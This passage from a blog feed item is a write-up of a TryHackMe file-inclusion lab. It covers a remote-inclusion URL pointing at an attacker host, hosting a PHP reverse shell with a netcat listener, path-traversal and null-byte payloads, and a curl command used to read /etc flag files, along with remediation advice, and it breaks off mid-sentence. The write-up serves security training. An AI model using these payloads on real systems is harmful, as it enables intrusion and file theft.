-&lt;p&gt;First, the attacker injects the malicious URL, which points to the attacker’s server, such as http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt. If there is no input validation, then the malicious URL passes into the include function. Next, the web app server will send a GET request to the malicious server to fetch the file. As a result, the web app includes the remote file into include function to execute the PHP file within the page and send the execution content to the attacker. In our case, the current page somewhere has to show the Hello THM message.&lt;/p&gt;
-
-&lt;p&gt;Visit the following lab URL: http://10.10.77.73/playground.php to try out an RFI attack.&lt;/p&gt;
-
-&lt;p&gt;Save and host a php reverse shell from pentestmonkey and setup a netcat listener.&lt;/p&gt;
-
-&lt;h3 id=&quot;task-7-remediation&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Task 7 Remediation&lt;/h3&gt;
-
-&lt;p&gt;As a developer, it’s important to be aware of web application vulnerabilities, how to find them, and prevention methods. To prevent the file inclusion vulnerabilities, some common suggestions include:&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;Keep system and services, including web application frameworks, updated with the latest version.&lt;/li&gt;
-  &lt;li&gt;Turn off PHP errors to avoid leaking the path of the application and other potentially revealing information.&lt;/li&gt;
-  &lt;li&gt;A Web Application Firewall (WAF) is a good option to help mitigate web application attacks.&lt;/li&gt;
-  &lt;li&gt;Disable some PHP features that cause file inclusion vulnerabilities if your web app doesn’t need them, such as allow_url_fopen on and allow_url_include.&lt;/li&gt;
-  &lt;li&gt;Carefully analyze the web application and allow only protocols and PHP wrappers that are in need.&lt;/li&gt;
-  &lt;li&gt;Never trust user input, and make sure to implement proper input validation against file inclusion.&lt;/li&gt;
-  &lt;li&gt;Implement whitelisting for file names and locations as well as blacklisting.&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;h3 id=&quot;task-8-challenge&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Task 8 Challenge&lt;/h3&gt;
-
-&lt;p&gt;Great Job! Now apply the techniques you’ve learned to capture the flags! Familiarizing yourself with HTTP Web basics could help you complete these challenges.&lt;/p&gt;
-
-&lt;p&gt;Make sure the attached VM is up and running then visit: http://10.10.77.73/challenges/index.php
-Steps for testing for LFI&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;Find an entry point that could be via GET, POST, COOKIE, or HTTP header values!&lt;/li&gt;
-  &lt;li&gt;Enter a valid input to see how the web server behaves.&lt;/li&gt;
-  &lt;li&gt;Enter invalid inputs, including special characters and common file names.&lt;/li&gt;
-  &lt;li&gt;Don’t always trust what you supply in input forms is what you intended! Use either a browser address bar or a tool such as Burpsuite.&lt;/li&gt;
-  &lt;li&gt;Look for errors while entering invalid input to disclose the current path of the web application; if there are no errors, then trial and error might be your best option.&lt;/li&gt;
-  &lt;li&gt;Understand the input validation and if there are any filters!&lt;/li&gt;
-  &lt;li&gt;Try the inject a valid entry to read sensitive files&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;&lt;strong&gt;Answer the questions below&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Capture Flag1 at /etc/flag1&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;In order to get this flag we have to edit change the MIME to post and the Media Type as well. This is a compolation of all of these we can choose from:&lt;/p&gt;
-
-&lt;p&gt;https://www.iana.org/assignments/media-types/media-types.xhtml&lt;/p&gt;
-
-&lt;p&gt;Adding &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Encoding: application/x-www-form-urlencoded&lt;/code&gt; and then changing from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GET&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;POST&lt;/code&gt; and using the paramater &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file=../../../etc/flag1&lt;/code&gt; will get us our first flag. See pic below.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/fileinc-flag1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Capture Flag2 at /etc/flag2&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;“Only admins can access this page!” And checking the hint we need to adjust the cookies in order to get this flag.&lt;/p&gt;
-
-&lt;p&gt;The file include function is telling us it is grabbing a php and messing with the cookie in the storage tab of the developer tools and adding a null byte at the end gets us our flag.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Capture Flag3 at /etc/flag3&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;curl -X POST http://10.10.179.213/challenges/chall3.php -d ‘method=POST&amp;amp;file=../../../../etc/flag3%00’ –output -&lt;/p&gt;
-
-&lt;p&gt;Gain RCE in Lab #Playground /playground.php with RFI to execute the hostname command. What is the output? We did this above already.&lt;/p&gt;
-
-&lt;p&gt;Booted up a simple http server and called it&lt;/p&gt;
-
-</description>
-        <pubDate>Thu, 09 Jun 2022 00:00:00 -0700</pubDate>
-        <link>http://localhost:4000//TryHackMe-File-Inclusion</link>
-        <link href="http://localhost:4000/TryHackMe-File-Inclusion"/>
-        <guid isPermaLink="true">http://localhost:4000/TryHackMe-File-Inclusion</guid>
       </item>
     
   </channel>
